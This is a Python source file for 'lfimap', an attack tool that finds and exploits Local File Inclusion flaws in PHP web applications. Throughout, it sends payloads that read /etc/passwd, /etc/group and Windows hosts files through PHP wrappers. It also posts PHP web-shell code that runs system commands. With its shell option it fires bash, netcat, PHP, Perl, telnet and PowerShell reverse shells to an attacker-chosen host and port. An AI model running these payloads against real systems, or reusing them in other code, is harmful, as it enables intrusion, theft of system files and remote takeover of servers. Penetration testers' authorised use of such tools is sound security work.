#!/usr/bin/env python3

import os
import sys
import re
import socket
import subprocess
import time
import random
import argparse
import requests
import requests.exceptions
import threading
import http.client
import http.server
import socketserver
import traceback
import errno
import fileinput

from contextlib import closing
from argparse import RawTextHelpFormatter

exploits = []
proxies = {}
rfi_test_port = 443

class ServerHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

def serve_forever():
    socketserver.TCPServer.allow_reuse_address = True
    try:
        with socketserver.TCPServer(("", rfi_test_port), ServerHandler) as httpd:

            if(args.verbose):
                print("[i] Opening local web server on port " +  str(rfi_test_port) + " and setting up 'rfitest.txt' that will be used as test inclusion")

            tempf = open("rfitest.txt", "w")
            tempf.write("961bb08a95dbc34397248d92352da799")
            tempf.close()
        
            try:
                httpd.serve_forever()
            except:
                httpd.server_close()
    except:
        print("[!] Cannot setup local web server on port " + str(rfi_test_port) + ", it's in use or unavailable! Skipping RFI check...")
        pass


def prepareHeaders():
    user_agents = [
                "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
                "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
                "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
                "Mozilla/3.01 (Macintosh; PPC)",
                "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",
                "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
                "Opera/8.00 (Windows NT 5.1; U; en)",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
                  ]                                                                                                                                                                             
    headers = {}                                                                                                                                                                                
    if(args.agent):
        headers['User-Agent'] = agent                                                                                                                                                     
    else:                                                                                                                                                                    
        headers['User-Agent'] = random.choice(user_agents)                                                                                                                                      
    if(args.referer):
        headers['Referer'] = referer
    
    headers['Accept-Language'] = 'en-US;'
    headers['Accept-Encoding'] = 'gzip, deflate'
    headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;'
    headers['Connection'] = 'Close'
    return headers


def addHeader(newKey, newVal):
    headers[newKey] = newVal

def getExploit(req, request_type, exploit_type, getVal, postVal, headers, attackType, os):
    global exploits
    e = {}
    e['REQUEST_TYPE'] = request_type
    e['EXPLOIT_TYPE'] = exploit_type
    e['GETVAL'] = getVal
    e['POSTVAL'] = postVal
    e['HEADERS'] = req.headers
    e['ATTACK_METHOD'] = attackType
    e['OS'] = os
    exploits.append(e)
    return e

def test_file_wrapper(url):
    if(args.verbose):
        print("Testing file wrapper inclusion")
    
    testL = []
    testL.append("file:///etc/passwd")
    testL.append("file:///etc/passwd%00")
    testL.append("file%3A%2F%2F%2Fetc%2Fpasswd")
    testL.append("file%3A%2F%2F%2Fetc%2Fpasswd%2500")
    testL.append("file:///etc/group")
    testL.append("file:///etc/group%00")
    testL.append("file%3A%2F%2F%2Fetc%2Fgroup")
    testL.append("file%3A%2F%2F%2Fetc%2Fgroup%2500")
    testL.append("///etc/passwd")

    for i in range(len(testL)):
        u = url.replace(args.param, testL[i])
        res = requests.get(u, headers = headers, proxies = proxies)
        
        if(init(res, 'GET', 'LFI', u, '', headers, 'FILE')):
            break

def init(req, reqType, explType, getVal, postVal, headers, attackType):

    #Add them from the most complex one to the least complex. This is important.
    TO_REPLACE = ["Windows/System32/drivers/etc/hosts", "cat%20/etc/passwd|head%20-n%201", 
                  "cat%20/etc/group|head%20-n%201", "cat%20%2F%2Fetc%2Fpasswd",
                  "cat%20%2F%2Fetc%2Fgroup","file%3A%2F%2F%2Fetc%2Fpasswd%2500", 
                  "file%3A%2F%2F%2Fetc%2Fpasswd", "cat%20/etc/passwd", "cat%20/etc/group",
                  "///etc/passwd","/etc/passwd", "file%3A%2F%2F%2Fetc%2Fgroup%2500", 
                  "file%3A%2F%2F%2Fetc%2Fgroup", "file://etc/group%00", "file:///etc/group", 
                  "/etc/group","https://www.google.com/", "rfitest.txt", "ipconfig"]
   
    if(checkPayload(req)):
        for i in range(len(TO_REPLACE)):
            if(getVal.find(TO_REPLACE[i]) > -1):
                u = getVal.replace(TO_REPLACE[i], "CMD")
                
                if("Windows" in TO_REPLACE[i]):
                    os = "WINDOWS"
                else: os = "LINUX"
                exploit = getExploit(req, reqType, explType, u, postVal, headers, attackType, os)
            
                #Printing finding
                if(postVal == ""):
                    print("[+] " + explType + " -> " + getVal)
                else:
                    print("[+] "+ explType + " -> " + getVal + ", HTTP POST -> " + postVal)
            
                if(args.revshell):
                    pwn(exploit)
               
                if not args.no_stop:
                    return True
                return False

        if(args.revshell):
            pwn(exploit)
               
        if(not args.no_stop):
            return True
        return False


def test_trunc(url):
    if(args.verbose):
        print("Testing path truncation using '" + wordlist + "' wordlist ...")

    f = open(wordlist, "r")
    
    for line in f:
        line = line[:-1]
        if(args.param in url):
            u = url.replace(args.param, line)

            try:
                res = requests.get(u, headers = headers, proxies = proxies)
                
                if(init(res, 'GET', 'LFI', u, '', headers, 'TRUNC')):
                    f.close()
                    break
            except Exception as e:
                continue
    f.close()


def test_filter(url):
    if(args.verbose):
        print("Testing PHP filter wrapper ...")

    testL = []
    testL.append("php://filter/resource=/etc/passwd")
    testL.append("php://filter/resource=/etc/passwd%00")
    testL.append("php://filter/convert.base64-encode/resource=/etc/passwd")
    testL.append("php://filter/convert.base64-encode/resource=/etc/passwd%00")
    testL.append("php://filter/read=string.rot13/resource=/etc/passwd")
    testL.append("php://filter/read=string.rot13/resource=/etc/passwd%00")
    testL.append("php://filter/resource=/etc/group")
    testL.append("php://filter/resource=/etc/group%00")
    testL.append("php://filter/convert.base64-encode/resource=/etc/group")
    testL.append("php://filter/convert.base64-encode/resource=/etc/group%00")
    testL.append("php://filter/read=string.rot13/resource=/etc/group")
    testL.append("php://filter/read=string.rot13/resource=/etc/group%00")
        
    testW = []
    testW.append("php://filter/resource=C:/Windows/System32/drivers/etc/hosts")
    testW.append("php://filter/resource=C:/Windows/System32/drivers/etc/hosts%00")
    testW.append("php://filter/convert.base64-encode/resource=C:/Windows/System32/drivers/etc/hosts")
    testW.append("php://filter/convert.base64-encode/resource=C:/Windows/System32/drivers/etc/hosts%00")
    testW.append("php://filter/read=string.rot13/resource=C:/Windows/System32/drivers/etc/hosts")
    testW.append("php://filter/read=string.rot13/resource=C:/Windows/System32/drivers/etc/hosts%00")
    
    for i in range(len(testL)):
        if(args.param in url):
            u = url.replace(args.param, testL[i])
        try:
            res = requests.get(u, headers = headers, proxies = proxies)
            if(init(res, 'GET', 'LFI', u, '', headers, 'FILTER')):
                break
        except ConnectionError:
            print("Connection error has occurred...")
        except Exception as e:
            pass

def test_data(url):
    if(args.verbose):
        print("Testing PHP data wrapper ...")

    testL = []
    testL.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20/etc/passwd")
    testL.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20/etc/group")

    testW = []
    testW.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=ipconfig")
    testW.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&ctype%20C:/Windows/System32/drivers/etc/hosts")
    
    for i in range(len(testL)):
        if(args.param in url):
            u = url.replace(args.param, testL[i])
        try:
            res = requests.get(u, headers = headers, proxies = proxies)
            if(init(res, 'GET', 'RCE', u, '', headers, 'DATA')):
                break
        except Exception as e:
            lfimap_cleanup()

def test_input(url):
    if(args.verbose):
        print("Testing PHP input wrapper ...")

    testL = []
    testL.append("php://input&cmd=cat%20/etc/passwd")
    testL.append("php://input&cmd=cat%20/etc/group")

    testW = []
    testW.append("php://input&cmd=ipconfig")
    
    posts = []
    posts.append("<?php echo(shell_exec($_GET['cmd']));?>")
    posts.append("<?php echo(exec($_GET['cmd']));?>")
    posts.append("<?php echo(passthru($_GET['cmd']));?>")
    posts.append("<?php echo(system($_GET['cmd']));?>")
    
    for i in range(len(testL)):
        if(args.param in url):
            u = url.replace(args.param, testL[i])
        
        for j in range(len(posts)):
            try:
                res = requests.post(u, headers = headers, data=posts[j], proxies = proxies)
                if(init(res, 'POST', 'RCE', u, posts[j], headers, 'INPUT')):
                    return
            except Exception as e:
                #lfimap_cleanup()        
                pass

def test_expect(url):
    if(args.verbose):
            print("Testing PHP expect wrapper ...")

    testL = []
    testL.append("expect://etc/passwd")
    testL.append("expect://etc/group")
    testL.append("expect:%2F%2Fcat%20%2Fetc%2Fpasswd")
    testL.append("expect:%2F%2Fcat%20%2Fetc%2Fgroup")

    testW = []
    testW.append("expect:%2F%2Fipconfig")

    #Linux
    for i in range(len(testL)):
        if(args.param in url):
            u = url.replace(args.param, testL[i])
        
        try:
            res = requests.get(u, headers = headers, proxies = proxies)
            if(init(res, 'GET', 'RCE', u, '', headers, 'EXPECT')):
                return
        
        except:
            #lfimap_cleanup()
            pass

def test_rfi(url):
    if(args.verbose):
        print("Testing for RFI ...")
    
    #Localhost RFI test
    if(args.lhost):
        try:
            threading.Thread(target=serve_forever).start()
            
            u = url.replace(args.param, "http://{0}:{1}/rfitest.txt".format(args.lhost, str(rfi_test_port)))
            res = requests.get(u, headers = headers, proxies = proxies, timeout = 1)
            if(init(res, 'GET', 'RFI', u, '', headers, 'RFI')):
                return
        except:
            #lfimap_cleanup()
            pass

    #Internet RFI test
    pyld = "https://www.google.com/"
    u = url.replace(args.param, pyld)
    try:
        res = requests.get(u, headers = headers, proxies = proxies, timeout = 1)
        if(init(res, 'GET', 'RFI', u, '', headers, 'OTHER')):
            return
    except:
        #lfimap_cleanup()
        pass

#Checks if sent payload is executed, key word check in response
def checkPayload(webResponse):
    KEY_WORDS = ["root:x:0:0", "www-data:",
                "cm9vdDp4OjA", "Ond3dy1kYX", "ebbg:k:0:0", "d3d3LWRhdG",
                "jjj-qngn:k", "daemon:x:1:", "r o o t : x : 0 : 0", "ZGFlbW9uOng6",
                "; for 16-bit app support", "sample HOSTS file used by Microsoft",
                "iBvIG8gdCA6IHggOiA", "OyBmb3IgMTYtYml0IGFwcCBzdXBw", "c2FtcGxlIEhPU1RTIGZpbGUgIHVzZWQgYnkgTWljcm9zb2", 
                "Windows IP Configuration", "OyBmb3IgMT", "; sbe 16-ovg ncc fhccbeg",
                "; sbe 16-ovg ncc fhccbeg", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
                ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
                "c2FtcGxlIEhPU1RT", "=1943785348b45", "www-data:x",
                "window.google=", "961bb08a95dbc34397248d92352da799"]

    for i in range(len(KEY_WORDS)):
        if KEY_WORDS[i] in webResponse.text:
            return True
    return False


def printInfo(ip, port, shellType, attackMethod):
    print("[i] Sending reverse shell to {0}:{1} using {2} via {3}...".format(ip, port, shellType, attackMethod))



def exploit_bash(exploit, method, ip, port):
    
    url = exploit['GETVAL']
    
    bashTest = "which%20bash"
    bashPayloadStageOne = "echo+'bash+-i+>%26+/dev/tcp/"+ip+"/"+str(port)+"+0>%261'>/tmp/1.sh"
    bashPayloadStageTwo = "bash+/tmp/1.sh"

    if(method == "INPUT"):
        res = requests.post(url.replace('CMD', bashTest), headers = headers, data=exploit['POSTVAL'], proxies = proxies)
        if('/bash' in res.text):
            u = url.replace('CMD', bashPayloadStageOne)
            printInfo(ip, port, 'bash', 'input wrapper')
            requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
            requests.post(url.replace('CMD', bashPayloadStageTwo), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
            return True
    elif(method == "DATA"):
        res = requests.get(url.replace('CMD', bashTest), headers = headers, proxies = proxies)
        if('/bash' in res.text):
            printInfo(ip, port, 'bash', 'data wrapper')
            requests.get(url.replace('CMD', bashPayloadStageOne), headers = headers, proxies = proxies)
            requests.get(url.replace('CMD', bashPayloadStageTwo), headers = headers, proxies = proxies)
            return True
    elif(method == "EXPECT"):
        res = requsts.get(url.replace('CMD', bashTest), headers = headers, proxies = proxies)
        if('/bash' in res.text):
            printInfo(ip, port, 'bash', 'expect wrapper')
            requests.get(url.replace('CMD', bashPayloadStageOne), headers = headers, proxies = proxies)
            requests.get(url.replace('CMD', bashPayloadStageTwo), headers = headers, proxies = proxies)
            return True


def exploit_nc(exploit, method, ip, port):
    
    url = exploit['GETVAL']

    ncTest = "which%20nc"
    ncPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f"

    if(method == "INPUT"):
        res = requests.post(url.replace('CMD', ncTest), headers = headers, data=exploit['POSTVAL'], proxies = proxies)
        if('/bin' in res.text and '/nc' in res.text):
            printInfo(ip, port, 'nc', 'input wrapper')
            requests.post(url.replace('CMD', ncPayload), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
            return True
    elif(method == "DATA"):
        res = requests.get(url.replace('CMD', ncTest), headers = headers, proxies = proxies)
        if('/bin' in res.text and '/nc' in res.text):
            printInfo(ip, port, 'nc', 'data wrapper')
            requests.get(url.replace('CMD', ncPayload), headers = headers, proxies = proxies)
            return True
    elif(method == "EXPECT"):
        res = requests.get(url.replace('CMD', ncTest), headers = headers, proxies = proxies)
        if('/bin' in res.text and '/nc' in res.text):
            printInfo(ip, port, 'nc', 'expect wrapper')
            requests.get(url.replace('CMD', ncPayload), headers = headers, proxies = proxies)
            return True

def exploit_php(exploit, method, ip, port):

    url = exploit['GETVAL']

    phpTest = "which%20php"
    phpPayload =  "php+-r+'$sock%3dfsockopen(\"{0}\",{1})%3bexec(\"/bin/sh+-i+<%263+>%263+2>%263\")%3b'".format(ip, str(port))

    if(method == "INPUT"):
        u = url.replace('CMD', phpTest)
        res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
        if('/bin' in res.text and '/php' in res.text):
            printInfo(ip, port, 'PHP', 'input wrapper')
            requests.post(url.replace('CMD', phpPayload), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
            return True
    elif(method == "DATA"):
        res = requests.get(url.replace('CMD', phpTest), headers = headers, proxies = proxies)
        if('/bin' in res.text and '/php' in res.text):
            printInfo(ip, port, 'PHP', 'data wrapper')
            requests.get(url.replace('CMD', phpPayload), headers = headers, proxies = proxies)
            return True
    elif(method == "EXPECT"):
        res = requests.get(url.replace('CMD', phpTest), headers = headers, proxies = proxies)
        if('/bin' in res.text and '/php' in res.text):
            printInfo(ip, port, 'PHP', 'expect wrapper')
            requests.get(url.replace('CMD', phpPayload), headers = headers, proxies = proxies)
            return True

def exploit_perl(exploit, method, ip, port):

    url = exploit['GETVAL']

    perlTest = "which%20perl"
    perlPayload = "perl+-e+'use+Socket%3b$i%3d\"" + ip + "\"%3b$p%3d"+str(port)+"%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname"\
                  "(\"tcp\"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\")%3bopen(STDOUT,\">%26S\")%3bopen"\
                  "(STDERR,\">%26S\")%3bexec(\"/bin/sh+-i\")%3b}%3b'"

    if(method == "INPUT"): 
        res = requests.post(url.replace('CMD', perlTest), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
        if('/bin' in res.text and '/perl' in res.text):
            u = url.replace('CMD', perlPayload)
            printInfo(ip, port, 'perl', 'input wrapper')
            requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
            return True
    if(method == "DATA"):
        res = requests.get(url.replace('CMD', perlTest), headers = headers, proxies = proxies)
        if('/bin' in res.text and '/perl' in res.text):
            printInfo(ip, port, 'perl', 'data wrapper')
            requests.get(url.replace('CMD', perlPayload), headers = headers, proxies = proxies)
            return True
    if(method == "EXPECT"):
        res = requests.get(url.replace('CMD', perlTest), headers = headers, proxies = proxies)
        if('/bin' in res.text and '/perl' in res.text):
            printInfo(ip, port, 'perl', 'expect wrapper')
            requests.get(url.replace('CMD', perlPayload), headers = headers, proxies = proxies)
            return True


def exploit_telnet(exploit, method, ip, port):

    url = exploit['GETVAL']

    telnetTest = "which%20telnet"
    telnetPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, str(port))

    if(method == "INPUT"):
        res = requests.post(url.replace('CMD', telnetTest), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
        if('/bin' in res.text and '/telnet' in res.text):
            u = url.replace('CMD', telnetPayload)
            printInfo(ip, port, 'telnet', 'input wrapper')
            requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
            return True
    elif(method == "DATA"):
        res = requests.get(url.replace('CMD', telnetTest), headers = headers, proxies = proxies)
        if('/bin' in res.text and '/telnet' in res.text):
            u = url.replace('CMD', telnetPayload)
            printInfo(ip, port, 'telnet', 'data wrapper')
            requests.get(u, headers = headers, proxies = proxies)
            return True
    elif(method == "EXPECT"):
        res = requests.get(url.replace('CMD', telnetTest), headers = headers, proxies = proxies)
        if('/bin' in res.text and '/telnet' in res.text):
            u = url.replace('CMD', telnetPayload)
            printInfo(ip, port, 'telnet', 'expect wrapper')
            requests.get(u, headers = headers, proxies = proxies)
            return True

def exploit_powershell(exploit, method, ip, port):

    url = exploit['GETVAL']
    powershellTest = "powershell.exe%20ipconfig"
    powershellPayload =  "powershell+-nop+-c+\"$client+%3d+New-Object+System.Net.Sockets.TCPClient('{IP}',{PORT})%3b$stream+%3d+$client."\
                         "GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data"\
                         "+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$"\
                         "sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream"\
                         ".Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()\" "

    powershellPayload = powershellPayload.replace("{IP}", ip)
    powershellPayload = powershellPayload.replace("{PORT}", str(port))

    if(method == "INPUT"):
        res = requests.post(url.replace('CMD', powershellTest), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
        if('Windows IP Configuration' in res.text):
            u = url.replace('CMD', powershellPayload) 
            requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
            printInfo(ip, port, 'powershell', 'input wrapper')
            return True
    elif(method == "DATA"):
        res = requests.get(url.replace('CMD', powershellTest), headers = headers, proxies = proxies)
        if('Windows IP Configuration' in res.text):
            printInfo(ip, port, 'powershell', 'data wrapper')
            u = url.replace('CMD', powershellPayload)
            requests.get(u, headers = headers, proxies = proxies)
            return True
    elif(method == "EXPECT"):
            res = requests.get(url.replace('CMD', powershellTest), headers = headers, proxies = proxies)
            if('Windows IP Configuration' in res.text):
                u = url.replace('CMD', powershellPayload)
                printInfo(ip, port, 'powershell', 'expect wrapper')
                requests.get(u, headers = headers, proxies = proxies)
                return True

def exploit_rfi(exploit, method, ip, port):

    url = exploit['GETVAL']
    
    #Modify reverse_shell.txt ip and port number values
    with(fileinput.FileInput("reverse_shell.php", inplace = True)) as file:
        for line in file:
            #This redirects stdout to a file, replacing the ip and port values as needed
            print(line.replace("IP_ADDRESS", ip), end='')
    with(fileinput.FileInput("reverse_shell.php", inplace = True)) as file:
        for line in file:
            print(line.replace("PORT_NUMBER", str(port)), end='')


    if(args.verbose): printInfo(ip, port, 'php', 'Remote File Inclusion')
    requests.get(url.replace("CMD", "/reverse_shell.php"), headers = headers, proxies = proxies)
    return

def pwn(exploit):
    
    ip = args.lhost
    port = args.lport
    
    method = exploit['ATTACK_METHOD']

    if(method == "INPUT"):
        if(exploit['OS'] == "LINUX"):
            if(exploit_bash(exploit, "INPUT", ip, port)): return
            if(exploit_nc(exploit, "INPUT", ip, port)): return
            if(exploit_php(exploit, "INPUT", ip, port)): return
            if(exploit_perl(exploit, "INPUT", ip, port)): return
            if(exploit_telnet(exploit, "INPUT", ip, port)): return
        else:
            if(exploit_powershell(exploit, "INPUT", ip, port)): return   

    elif(method == "DATA"):
        if(exploit['OS'] == "LINUX"):
            print("Inside pwn at DATA sectrion")
            if(exploit_bash(exploit, "DATA", ip, port)): return
            if(exploit_nc(exploit, "DATA", ip, port)): return
            if(exploit_php(exploit, "DATA", ip, port)): return
            if(exploit_perl(exploit, "DATA", ip, port)): return
            if(exploit_telnet(exploit, "DATA", ip, port)): return
        else:
            if(exploit_powershell(exploit, "DATA", ip, port)): return

    elif(method == "EXPECT"):
        if(exploit['OS'] == "LINUX"):
            if(exploit_bash(exploit, "EXPECT", ip, port)): return
            if(exploit_nc(exploit, "EXPECT", ip, port)): return
            if(exploit_php(exploit, "EXPECT", ip, port)): return
            if(exploit_perl(exploit, "EXPECT", ip, port)): return
            if(exploit_telnet(exploit, "EXPECT", ip, port)): return
        else:
            if(exploit_powershell(exploit, "EXPECT", ip, port)): return 

    elif(method == "RFI"):
        if(exploit_rfi(exploit, "RFI", ip, port)): return


def lfimap_cleanup():
    if(os.path.exists('rfitest.txt')):
        os.remove('rfitest.txt')
    
    #Modify reverse_shell.txt ip and port number values to default
    if(args.lhost):
        with(fileinput.FileInput("reverse_shell.php", inplace = True)) as file:
            for line in file:
                #This redirects stdout to a file, setting ip and port values to default
                print(line.replace(args.lhost, "IP_ADDRESS"), end='')
    if(args.lport):
        with(fileinput.FileInput("reverse_shell.php", inplace = True)) as file:
            for line in file:
                print(line.replace(str(args.lport), "PORT_NUMBER"), end='')

    os._exit(0)

def main():
    global exploits
    global proxies
    
    if(args.proxyAddr):
        proxies['http'] = 'http://'+args.proxyAddr
        proxies['https'] = 'https://'+args.proxyAddr

    #Perform all tests
    if(args.test_all):
        test_file_wrapper(url)
        test_filter(url)
        test_input(url)
        test_data(url)
        test_expect(url)
        test_rfi(url)
        test_trunc(url)
        
        print("Done.")
        lfimap_cleanup()

    default = True
    if(args.php_filter):
        default = False
        test_filter(url)
    if(args.php_input):
        default = False
        test_input(url)
    if(args.php_data):
        default = False
        test_data(url)
    if(args.php_expect):
        default = False
        test_expect(url)
    if(args.rfi):
        default = False
        test_rfi(url)
    if(args.trunc):
        default = False
        test_file_wrapper(url)
        test_trunc(url)

    #Default behaviour
    if(default):
        test_file_wrapper(url)
        test_filter(url)
        test_input(url)
        test_data(url)
        test_expect(url)
        test_rfi(url)
        test_trunc(url)

    print("Done.")
    lfimap_cleanup()

if(__name__ == "__main__"):
    
    print("")
    parser = argparse.ArgumentParser(description="lfimap, Local File Inclusion discovery and exploitation tool", formatter_class=RawTextHelpFormatter, add_help=False)
    
    mandatoryGroup = parser.add_argument_group('MANDATORY')
    mandatoryGroup.add_argument('url', type=str, metavar="URL", help="""\t\t Specify url, Ex: "http://example.org/vuln.php?param=PWN" """)
    
    optionsGroup = parser.add_argument_group('GENERAL OPTIONS')
    optionsGroup.add_argument('-H', type=str, metavar="<header>", action="append", dest="httpheaders", help="\t\t Specify additional HTTP header(s). Ex: 'X-Forwarded-For:127.0.0.1'")
    optionsGroup.add_argument('-C', type=str, metavar="<cookie>", dest='cookie', help='\t\t Specify session cookie, Ex: "PHPSESSID=1943785348b45"')
    optionsGroup.add_argument('-P', type=str, metavar = "<proxy>", dest="proxyAddr", help="\t\t Specify Proxy IP address. Ex: '127.0.0.1:8080'")
    optionsGroup.add_argument('--useragent', type=str, metavar= '<agent>', dest="agent", help="\t\t Specify HTTP user agent")
    optionsGroup.add_argument('--referer', type=str, metavar = '<referer>', dest='referer', help="\t\t Specify HTTP referer")
    optionsGroup.add_argument('--param', type=str, metavar="<name>", dest="param", help="\t\t Specify different test parameter value")
    optionsGroup.add_argument('--no-stop', action="store_true", dest = "no_stop", help="\t\t Don't stop using same method upon findings")

    attackGroup = parser.add_argument_group('ATTACK TECHNIQUE')
    attackGroup.add_argument('-f', '--filter', action = "store_true", dest = 'php_filter', help="\t\t Attack using filter:// wrapper")
    attackGroup.add_argument('-i', '--input', action = "store_true", dest = 'php_input', help="\t\t Attack using input:// wrapper")
    attackGroup.add_argument('-d', '--data', action = "store_true", dest = 'php_data', help="\t\t Attack using data:// wrapper")
    attackGroup.add_argument('-e', '--expect', action = "store_true", dest = 'php_expect', help="\t\t Attack using expect:// wrapper")
    attackGroup.add_argument('-t', '--trunc', action = "store_true", dest = "trunc", help="\t\t Attack using path truncation with wordlist (default 'short.txt')")
    attackGroup.add_argument('-r', '--rfi', action = "store_true", dest = 'rfi', help="\t\t Attack using remote file inclusion")
    attackGroup.add_argument('-a', '--all', action = "store_true", dest = 'test_all', help="\t\t Use all available methods to attack")
    
    
    payloadGroup = parser.add_argument_group('PAYLOAD OPTIONS')
    payloadGroup.add_argument('-x', '--shell',action="store_true", dest="revshell", help="\t\t Send reverse shell if possible (Setup reverse handler first)")
    payloadGroup.add_argument('--lhost', type=str, metavar="<lhost>", dest="lhost", help="\t\t Specify localhost IP address for reverse connection")
    payloadGroup.add_argument('--lport', type=int, metavar="<lport>", dest="lport", help="\t\t Specify local PORT number for reverse connection")
    
    wordlistGroup = parser.add_argument_group('WORDLIST OPTIONS')
    wordlistGroup.add_argument('-wT', type=str, metavar = "<path>", dest="truncwordlist", help="\t\t Specify wordlist for truncation test")
    
    otherGroup = parser.add_argument_group('OTHER')
    otherGroup.add_argument('-v', '--verbose', action="store_true", dest="verbose", help="\t\t Print more detailed output when performing attacks\n")
    otherGroup.add_argument('-h', '--help', action="help", default=argparse.SUPPRESS, help="\t\t Print this help message\n\n")
    args = parser.parse_args()

    url = args.url
    wordlist = args.truncwordlist
    agent = args.agent
    referer = args.referer
    
    if(args.test_all or args.rfi):
        if(os.getuid() != 0):
            print("[-] Please run lfimap as admin/root for RFI test. Exiting...")
            sys.exit()
        if(not args.lhost):
            print("[!] Warning: lfimap will try to test RFI using remote site. If target is in your network, try to also specify '--lhost' parameter")

    urlRegex = re.compile(

    #Checks if provided URL is valid
    r'^(?:http|ftp)s?://' # http:// or https:// or ftp://
    r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
    r'localhost|' #localhost...
    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
    r'(?::\d+)?' # optional port
    r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    
    if(re.match(urlRegex, url) is None):
        print("URL not valid, exiting...")
        sys.exit(-1)
    elif(not args.param):
        args.param = "PWN"

    #Checks if provided wordlist exists
    if(wordlist is not None):
        if(not os.path.isfile(wordlist)):
            print("[-] Specified wordlist '"+ wordlist + "' doesn't exist. Exiting...")
            sys.exit(-1)
    else:
        wordlist = "wordlists/short.txt"
        if(not os.path.exists(wordlist) and args.test_all):
            print("[-] Cannot find 'short.txt' list. Since '-a' was specified, lfimap will exit...")
            sys.exit(-1)
    
    #Checks if '--lhost' and '--lport' are provided with '-x'
    if(args.revshell):
        if(not args.lhost):
            print("[-] Please, specify localhost IP ('--lhost') for reverse shell. Exiting...")
            sys.exit(-1)

        if(not args.lport):
            print("[-] Please, specify localhost PORT number ('--lport') for reverse shell. Exiting...")
            sys.exit(-1)

        else:
            reg = r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
            if(not re.match(reg, args.lhost)):
                print("[-] LHOST IP address is not valid. Exiting...")
                sys.exit(-1)

            if(args.lport < 1 or args.lport > 65534):
                print("[-] LPORT must be between 1 and 65534. Exiting ...")
                sys.exit(-1)

    #Checks if any parameter is selected for testing
    if(args.param not in url):
        print("[-] '" + args.param + "' is not found in the URL. Please specify it as a parameter value for testing. Exiting...\n")
        sys.exit(-1)
    
    #Warning if cookie is not provided
    if(not args.cookie):
        print("[!] WARNING: Cookie argument ('-c') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.\n")
        time.sleep(2)

    #Everything is OK, preparing headers
    headers = prepareHeaders()
    if(args.cookie is not None):
        addHeader('Cookie', args.cookie)
    if(args.httpheaders):
        for i in range(len(args.httpheaders)):
            if(":" not in args.httpheaders[i]):
                print("'"+args.httpheaders[i]+"'" + " has no ':' to distinguish parameter name from value, exiting...")
                sys.exit(-1)     
            elif(args.httpheaders[i][0] == ":"):
                print("Header name cannot start with ':' character. Exiting...")
                sys.exit(-1)
            else:
                addHeader(args.httpheaders[i].split(":",1)[0].replace(" ",""), args.httpheaders[i].split(":",1)[1].replace(" ", ""))
    main()
